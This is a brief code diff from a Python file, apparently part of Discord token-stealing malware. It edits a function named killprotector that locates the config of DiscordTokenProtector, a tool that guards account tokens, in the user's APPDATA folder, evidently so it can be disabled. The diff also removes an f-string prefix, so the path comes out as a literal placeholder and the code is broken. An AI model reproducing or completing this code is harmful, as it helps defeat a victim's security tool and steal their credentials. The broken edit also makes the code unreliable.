@@ -124,7 +124,7 @@ def create_temp(_dir: str or os.PathLike = gettempdir()):
 
 def killprotector():
     roaming = os.getenv('APPDATA')
-    path = f"{roaming}\\DiscordTokenProtector\\"
+    path = "{roaming}\\DiscordTokenProtector\\"
     config = path + "config.json"
 
     if not os.path.exists(path):
